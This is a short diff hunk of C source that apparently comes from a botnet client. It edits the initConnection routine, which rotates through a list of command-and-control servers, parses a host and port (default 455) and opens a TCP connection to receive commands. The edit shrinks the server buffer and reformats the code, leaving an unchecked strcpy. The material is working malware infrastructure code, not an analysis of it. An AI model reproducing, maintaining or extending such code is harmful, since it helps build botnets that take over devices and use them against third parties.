@@ -1390,25 +1390,25 @@ void processCmd(int argc, unsigned char *argv[])
  
 int initConnection()
 {
-        unsigned char server[4096];
-        memset(server, 0, 4096);
-        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; } //if da sock initialized then close dat
-        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
-        else currentServer++;
- 
-        strcpy(server, commServer[currentServer]);
-        int port = 455;
-        if(strchr(server, ':') != NULL)
-        {
-                port = atoi(strchr(server, ':') + 1);
-                *((unsigned char *)(strchr(server, ':'))) = 0x0;
-        }
- 
-        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
- 
-        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
- 
-        return 0;
+	unsigned char server[512];
+	memset(server, 0, 512);
+	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
+	if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
+	else currentServer++;
+
+	strcpy(server, commServer[currentServer]);
+	int port = 455;
+	if(strchr(server, ':') != NULL)
+	{
+		port = atoi(strchr(server, ':') + 1);
+		*((unsigned char *)(strchr(server, ':'))) = 0x0;
+	}
+
+	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
+
+	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
+
+	return 0;
 }
  
 int getOurIP()
